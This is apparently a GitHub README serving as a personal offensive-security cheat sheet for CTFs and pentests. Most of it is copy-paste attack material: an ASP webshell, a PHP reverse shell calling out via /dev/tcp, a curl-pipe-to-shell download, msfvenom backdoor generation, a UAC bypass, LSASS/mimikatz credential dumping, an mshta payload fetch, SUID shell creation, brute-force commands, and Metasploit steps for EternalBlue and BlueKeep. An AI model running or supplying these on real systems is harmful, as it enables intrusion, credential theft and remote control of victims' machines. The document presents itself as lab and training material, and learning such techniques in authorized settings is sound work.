# 🛠️ Hacking Notes by Xavi

This is my personal knowledge base for offensive security, pentesting, OSINT, and red‑team tactics. These notes are built from real investigations, research, and technical exercises — used during CTFs, labs, and private assessments.

> 📌 I use this repo for quick recall during engagements, training, and tool development. It's a practical‑first collection of syntax, techniques, and workflows I actually rely on.

---

## 🧠 What's Inside?

These notes are meant to be lightweight, focused, and copy‑paste friendly. Topics include:

* 🔍 **[Enumeration & Recon](#common-ports)** – Nmap, Gobuster, DNS, subdomain fuzzing, Shodan, more
* 🎯 **[Exploitation & Payloads](#exploits--scanners)** – Web attacks (SQLi, XSS), CVE usage, Metasploit, SSRF, IDOR, RCE
* 🔐 **[Post‑Exploitation](#privilege-escalation)** – Shells, privilege escalation (Linux/Windows), persistence
* 🗂️ **[Protocol & Service Attacks](#smb-examples)** – SSH, SMB, RDP, FTP, MySQL, and more
* 🧰 **[Tool Quick References](#configuration-files--tools)** – netcat, Hydra, wafw00f, curl, dig, enum4linux, etc.
* 🌐 **OSINT & External Intelligence** – Footprinting, email leaks, breach lookups, metadata collection (coming soon)

---

## Hacking Notes Cheat Sheet

Below is the full cheat‑sheet of commands and mini‑guides you can jump through using the links above:

### Common Ports

| Port    | Protocol | Service / Description            |
| ------- | -------- | -------------------------------- |
| 21      | TCP      | FTP control                      |
| 22      | TCP      | SSH                              |
| 23      | TCP      | Telnet                           |
| 25      | TCP      | SMTP                             |
| 53      | TCP/UDP  | DNS                              |
| 67      | UDP      | DHCP server                      |
| 68      | UDP      | DHCP client                      |
| 69      | UDP      | TFTP                             |
| 80      | TCP      | HTTP                             |
| 110     | TCP      | POP3                             |
| 123     | UDP      | NTP                              |
| 137–139 | UDP      | NetBIOS Name/Datagram/Session    |
| 143     | TCP      | IMAP                             |
| 161     | UDP      | SNMP                             |
| 162     | UDP      | SNMP Trap                        |
| 389     | TCP/UDP  | LDAP                             |
| 443     | TCP      | HTTPS                            |
| 445     | TCP      | Microsoft‑DS (SMB over TCP)      |
| 465     | TCP      | SMTPS (SMTP over SSL/TLS)        |
| 514     | UDP      | Syslog                           |
| 520     | UDP      | RIP                              |
| 587     | TCP      | SMTP (submission)                |
| 631     | TCP/UDP  | IPP (Internet Printing Protocol) |
| 993     | TCP      | IMAPS                            |
| 995     | TCP      | POP3S                            |
| 1433    | TCP      | Microsoft SQL Server             |
| 1521    | TCP      | Oracle DB listener               |
| 3306    | TCP      | MySQL                            |
| 3389    | TCP/UDP  | RDP                              |
| 5900    | TCP      | VNC                              |
| 8080    | TCP      | HTTP‑alt                         |

---

### Configuration Files & Tools

| Description             | Command | Syntax                  |
| ----------------------- | ------- | ----------------------- |
| Use VPN                 | openvpn | `openvpn [FILE.ovpn]`   |
| TCP Nmap Scan (no ping) | nmap    | `nmap -Pn [IP]/[RANGE]` |
| UDP Nmap Scan           | nmap    | `nmap -sU [IP]/[RANGE]` |

---

### Nmap Banner & Version Scanning Examples

```bash
# 1. Version + banner grab
nmap -sV --script=banner <target>

# 2. Default safe scripts + version detection
nmap -sV -sC <target>

# 3. HTTP title and headers on web server
nmap -p 80,443 --script=http-title,http-headers <target>

# 4. FTP banner + anonymous login check
nmap -p 21 --script=banner,ftp-anon <target>

# 5. SSH hostkey and banner grab
nmap -p 22 --script=ssh-hostkey,banner <target>

# 6. UDP version scan + DNS recursion check
nmap -sU -p 53 -sV --script=dns-recursion <target>

# 7. Intense version scan + all version scripts
nmap -sV --version-intensity 9 --script "version and" <target>
```

* **Nmap (banner + version)**
  `nmap -sV --script=banner <target>`

* **Netcat SMTP banner + HELO**
  `nc <target> 25 && echo -e "HELO <hostname>\r\nQUIT\r\n"`

* **SMTP user enumeration**
  `smtp-user-enum -t <target> -U /path/to/usernames.txt`

---

### WMAP (Web Scanner in Metasploit)

Scan web applications for common vulnerabilities using Metasploit's built‑in WMAP module.

```bash
# Start Metasploit
msfconsole

# Add a target site
wmap_sites -a http://<target-site>

# List all targets
wmap_sites -l

# Crawl the web application
wmap_run -t <target-id>

# Run enabled vuln modules
wmap_run -e

# List all WMAP modules
wmap_modules -l

# Enable a specific module
wmap_modules -e auxiliary/scanner/http/dir_scanner
```

---

### WebDAV Discovery & Upload with DAVTest

```bash
davtest -url http://<target>/webdav/ -methods all -upload
```

---

### Interactive WebDAV with Cadaver (upload shell.asp)

```bash
cadaver http://<target>/webdav/ << 'EOF'
put shell.asp
EOF
```

---

### Create ASP Webshell (shell.asp)

```bash
cat << 'EOF' > shell.asp
<%
  Set cmd = Request.QueryString("cmd")
  If cmd <> "" Then
    Set o = CreateObject("WScript.Shell")
    Set p = o.Exec(cmd)
    Response.Write "<pre>" & p.StdOut.ReadAll() & "</pre>"
  End If
%>
EOF
```

#### Execute Webshell

Browse to: `http://<target>/webdav/shell.asp?cmd=whoami`

---

### IIS WebDAV ASP Upload (CVE‑2017‑7269)

```bash
msfconsole -q

# Load the exploit module
use exploit/windows/iis/iis_webdav_upload_asp

# Set required options
set RHOSTS <target-ip>
set HttpUsername <username>
set HttpPassword <password>
set PATH /webdav/%RAND%.asp
```

---

### PsExec SMB Remote Code Execution

Leverages valid SMB credentials to remotely execute commands on a Windows machine using the **PsExec** technique.

```bash
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <username>
set SMBPass <password>
exploit
```

| Task / Step                            | Command |
| ------------------------------------- | ------- |
| **Brute‑force RDP login with Hydra**  | `hydra -L /path/to/userlist.txt -P /path/to/passwordlist.txt rdp://[TARGET] -s [PORT]` |
| **Use RDP Scanner (check RDP enabled)** | See code block below |
| **Scan for BlueKeep (CVE‑2019‑0708)** | See code block below |
| **Exploit BlueKeep (RCE) (optional)** | See code block below |
| **Connect using xfreerdp**            | `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]` |
---

### Directory Discovery with Gobuster

| Description | Command |
| --- | --- |
| Standard scan | `gobuster dir -u http://[IP]/ -w /usr/share/wordlists/dirb/common.txt` |
| Using SOCKS5 proxy | `gobuster dir -p socks5://[IP]:[PORT] --url http://[IP]/ -w common.txt` |

---

### Web & Content Discovery

| Description | Command | Syntax |
| --- | --- | --- |
| Robots.txt | curl/browser | `http://[IP]/robots.txt` |

---

### File/Data Analysis

| Description | Command | Syntax |
| --- | --- | --- |
| Extract strings | strings | `strings [FILE]` |

---

### WordPress Recon

| Description | Examples/Paths |
| --- | --- |
| Backup/Swap Files | `[file].swp`, `.bak`, `.old`, etc. |

---

### Access

| Service | Command Syntax |
| --- | --- |
| FTP | `ftp [IP]` |
| SSH | `ssh [user]@[IP]` |
| SMB List | `smbclient -L \\\\[IP]` |
| SMB Access | `smbclient \\\\[IP]\\[Share]` |


---

### SMB Enumeration & Exploitation Flow
  
   ```bash
   #  SMB Login Bruteforce (Metasploit)
   msfconsole -q
   use auxiliary/scanner/smb/smb_login
   set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
   set SMBUser <USERNAME>
   set RHOSTS <TARGET>
   exploit

   # Hydra SMB Bruteforce (Optional)
   gzip -d /usr/share/wordlists/rockyou.txt.gz
   hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET> smb

   # Enumerate Shares
   smbmap -H <TARGET> -u <USERNAME> -p <PASSWORD>
   smbclient -L <TARGET> -U <USERNAME>
   smbclient //<TARGET>/<SHARE> -U <USERNAME>

   # Retrieve Files
   ls
   cd hidden
   get flag.tar.gz
   exit
   tar -xf flag.tar.gz
   cat file

   # Named Pipe Auditor
   msfconsole -q
   use auxiliary/scanner/smb/pipe_auditor
   set SMBUser <USERNAME>
   set SMBPass <PASSWORD>
   set RHOSTS <TARGET>
   exploit

   # Enum 4 Linux
   enum4linux -r -u "<USERNAME>" -p "<PASSWORD>" <TARGET> 
   ```
---

### Dictionary & Wordlist Generation

| Tool | Command | Syntax |
| --- | --- | --- |
| cewl | Generate custom wordlist | `cewl [URL] > wordlist.txt` |

---

### Bruteforce Attacks

| Tool | Description | Syntax |
| --- | --- | --- |
| hydra | HTTP form brute force | `hydra -L [USERS] -P [PASSWORDS] [IP] -s [PORT] http-post-form "[url]:...:Invalid" -V` |
| wpscan | WordPress login brute force | `wpscan --url [URL] -U [USER] -P [WORDLIST]` |

---

### Privilege Escalation

| Task | Command / Path |
| --- | --- |
| Download LinPEAS | `curl [IP]:8000/linpeas.sh | sh` |
| Start HTTP server | `python3 -m http.server 8000` |
| Start Netcat listener | `nc -lvnp [PORT]` |
| Spawn TTY shell | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Reverse shell (PHP) | See code block below |
| Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
| Make binary SUID | `chmod u+s /tmp/bash` |


### Privilege Escalation via Token Impersonation
Using `incognito` to impersonate `blb\Administrator`:

```bash
load incognito
list_tokens -u
impersonate_token blb\\Administrator
getuid
```

### Privilege Escalation via BadBlue 2.7 (Passthru RCE → LSASS Migration → Mimikatz Dump)

1. On the attacker machine:

   ```bash
   searchsploit badblue 2.7
   msfconsole -q
   use exploit/windows/http/badblue_passthru
   set RHOSTS [host]
   exploit
   migrate -N lsass.exe
   load kiwi
   creds_all
   lsa_dump_sam
   lsa_dump_secrets
   ```
   
### Privilege Escalation via Akagi64.exe (UAC Bypass) with Reverse Shell

```bash
# After gaining initial Meterpreter session:
getuid
sysinfo

# Find a stable desktop user process (e.g., explorer.exe, winlogon.exe, svchost.exe) and migrate
ps -S explorer.exe
migrate process

# Generate reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f exe > backdoor.exe

# Upload Akagi64.exe (UAC bypass) and payload
cd C:\Users\admin\AppData\Local\Temp
upload Akagi64.exe
upload backdoor.exe

# Open new Metasploit listener to catch SYSTEM shell
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT <your-port>
exploit

# Trigger UAC bypass to launch elevated payload
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

# In the new session (SYSTEM), migrate to protected process and dump hashes
ps -S lsass.exe
migrate 496
hashdump
```

###  Privilege Escalation via PowerUp.ps1 + Unattend.xml + runas + HTA Reverse Shell

1. On the **target machine**, navigate to PowerUp and run a privesc audit:

   ```powershell
   cd .\Desktop\PowerSploit\Privesc\
   powershell -ep bypass
   . .\PowerUp.ps1
   Invoke-PrivescAudit
   ```
   
2. Read and decode the password securely (redacted here):
  ```powershell
  cat C:\Windows\Panther\Unattend.xml
  $password = '<base64_string>'
  $password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
  ```

3. Use runas to elevate to Administrator (use the decoded password):
  ```cmd
  runas.exe /user:Administrator cmd
  whoami
  ```

4. On the attacker machine, run:
  ```bash
  msfconsole -q
  use exploit/windows/misc/hta_server
  set LHOST <attacker_ip>
  exploit
  ```
5. Back on the target, trigger the reverse shell:
  ```cmd
  mshta.exe http://<attacker_ip>:8080/<payload>.hta
  ```

### PHP Reverse Shell Example

```php
<?php
if (isset($_GET['trigger'])) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
}
?>
```

Access: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`

---

### Binary Exploits (Python)

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
```

---

### Escape Restricted Shell

| Method     | Command                                           |
| ---------- | ------------------------------------------------- |
| Vim escape | `:!/bin/sh`<br>`:set shell=/bin/bash`<br>`:shell` |
| Tab check  | Press `TAB TAB` to list allowed commands          |

---

### Process Snooping Without Root

| Tool | Description       | Command/Source                                                           |
| ---- | ----------------- | ------------------------------------------------------------------------ |
| pspy | Monitor processes | `./pspy64s` (from [pspy GitHub](https://github.com/DominicBreuker/pspy)) |

---

### Port Scanning One‑Liner (Python)

```python
python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("10.10.10.0/24").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]'
```

---

### SSH Tunneling

| Task           | Syntax                      |
| -------------- | --------------------------- |
| Dynamic tunnel | `ssh -D [PORT] [USER]@[IP]` |

---

### Local File Inclusion – Base64 Read

| Task               | URL Example                                                                  |
| ------------------ | ---------------------------------------------------------------------------- |
| Base64 encode read | `http://[IP]/page=php://filter/convert.base64-encode/resource=wp-config.php` |

---

### Metasploit Basics

| Task                  | Command                  |
| --------------------- | ------------------------ |
| Start                 | `msfconsole`             |
| Search modules        | `search <keyword>`       |
| Load module           | `use <module_path>`      |
| Show options          | `show options`           |
| Set target IP         | `set RHOSTS <target-ip>` |
| Set local IP          | `set LHOST <your-ip>`    |
| Set payload           | `set PAYLOAD <payload>`  |
| Exploit               | `run` or `exploit`       |
| List sessions         | `sessions`               |
| Interact with session | `sessions -i <id>`       |

---

### Meterpreter Commands

| Command              | Description                                   |
| -------------------- | --------------------------------------------- |
| `help`               | Show all available Meterpreter commands       |
| `sysinfo`            | Get target system information                 |
| `getuid`             | Display current user ID                       |
| `ipconfig`           | Show network interfaces of the victim         |
| `ifconfig`           | Same as above (alias)                         |
| `shell`              | Drop into a standard command shell            |
| `background`         | Send Meterpreter session to background        |
| `sessions`           | List all active sessions                      |
| `sessions -i [ID]`   | Interact with a specific session              |
| `upload [src] [dst]` | Upload file to the target                     |
| `download [src]`     | Download file from the target                 |
| `edit [file]`        | Open a file on target in an editor            |
| `cat [file]`         | Output contents of a file                     |
| `pwd`                | Print working directory on the target         |
| `cd [dir]`           | Change directory on the target                |
| `ls`                 | List files in the current directory           |
| `ps`                 | List running processes                        |
| `migrate [PID]`      | Migrate to another process                    |
| `getprivs`           | Enumerate current session privileges          |
| `use stdapi`         | Load standard API if not loaded automatically |
| `keyscan_start`      | Start keylogger                               |
| `keyscan_dump`       | Dump recorded keystrokes                      |
| `screenshot`         | Take screenshot of the desktop                |
| `webcam_list`        | List webcams                                  |
| `webcam_snap`        | Take webcam snapshot                          |
| `record_mic`         | Record microphone audio                       |
| `hashdump`           | Dump password hashes                          |
| `clearev`            | Clear event logs                              |

---

### MySQL Auxiliary Modules

* **auxiliary/scanner/mysql/mysql\_version** – Retrieves MySQL version banner.
* **auxiliary/scanner/mysql/mysql\_login** – Brute‑force login.
* **auxiliary/admin/mysql/mysql\_enum** – Enumerate users/databases/privileges.
* **auxiliary/admin/mysql/mysql\_sql** – Run arbitrary SQL after auth.
* **auxiliary/scanner/mysql/mysql\_file\_enum** – Enumerate files via `LOAD_FILE()`.
* **auxiliary/scanner/mysql/mysql\_hashdump** – Dump password hashes.
* **auxiliary/scanner/mysql/mysql\_schemadump** – Dump schema metadata.
* **auxiliary/scanner/mysql/mysql\_writable\_dirs** – Find writable dirs via `INTO OUTFILE`.

---

### SSH Auxiliary Modules

* **auxiliary/scanner/ssh/ssh\_version** – Grab SSH banner.
* **auxiliary/scanner/ssh/ssh\_login** – Brute‑force SSH credentials.

---

### FTP Auxiliary Modules

* **auxiliary/scanner/ftp/ftp\_version** – Grab FTP banner.
* **auxiliary/scanner/ftp/ftp\_login** – Brute‑force FTP credentials.

---

### SMB Examples

| Task           | Command                                   |
| -------------- | ----------------------------------------- |
| List shares    | `smbclient -L \\\\[IP]`                   |
| Access share   | `smbclient \\\\[IP]\\[Share]`             |
| Use with proxy | `proxychains smbclient \\\\[IP]\\[Share]` |

---

### Cleanup and File Checks

| Task                  | Command                               |
| --------------------- | ------------------------------------- |
| Find passwords        | `grep -i password /etc/* 2>/dev/null` |
| Check crontab         | `crontab -l`                          |
| Inspect logout script | `vim ~/.bash_logout`                  |
| Inspect user config   | `vim ~/.config/`                      |

---

### Exploits & Scanners

| Name                         | CVE           | Tool       | Command                                                             | Port   |
| ---------------------------- | ------------- | ---------- | ------------------------------------------------------------------- | ------ |
| Shellshock (Apache mod\_cgi) | CVE‑2014‑6271 | Metasploit | `use exploit/multi/http/apache_mod_cgi_bash_env_exec` → `exploit`   | 80/443 |
| EternalBlue SMB Exploit      | CVE‑2017‑0144 | Metasploit | `use exploit/windows/smb/ms17_010_eternalblue` → `exploit`          | 445    |
| BlueKeep RDP Exploit         | CVE‑2019‑0708 | Metasploit | `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce` → `exploit`    | 3389   |
| BlueKeep RDP Scanner         | —             | Nmap       | `nmap -p3389 --script rdpscan --script-args rdpscan.hosts=<target>` | 3389   |

---

### WinRM Enumeration and Access

| Tool         | Description                        | Command / Syntax                                                            |
| ------------ | ---------------------------------- | --------------------------------------------------------------------------- |
| crackmapexec | Brute‑force WinRM via domain creds | `crackmapexec winrm [TARGET] -d [DOMAIN] -u usernames.txt -p passwords.txt` |
| evil-winrm   | Remote access with creds           | `evil-winrm -i [TARGET] -u [USER] -p [PASS] -d [DOMAIN]`                    |

---

## 🙋 About Me

I'm an information security specialist focused on technical execution and practical outcomes. My background includes:

* Cybersecurity tools deployment and management
* OSINT investigations
* Vulnerability assessment and advisory for infrastructure and cloud
* System monitoring, project coordination, and tooling automation
* Passion for offensive security, AI in cybersecurity, and security education

🎓 Currently pursuing a degree in Computer Science with Artificial Intelligence
☁️ AWS Certified Security – Specialty
🧠 Occasional OSINT HTB user and CTF player

🔗 [LinkedIn](https://www.linkedin.com/in/xavibages/) | [Hack The Box](https://app.hackthebox.com/users/289946)

---

## 📘 Why I Built This

This repo helps me:

* Avoid Googling the same payloads and tools
* Organize what I actually use in investigations
* Prepare for certs, interviews, and internal projects
* Share practical knowledge with peers and students

---

## ⚠️ Ethical Use Notice

All content in this repository is shared for legitimate educational and research purposes. Use this information responsibly, only within authorized environments such as labs, test systems, or CTF platforms. Unauthorized use may be illegal and unethical.

---

## 📄 License

This project is licensed under the **Apache License 2.0**.

[View Full License »](https://www.apache.org/licenses/LICENSE-2.0)
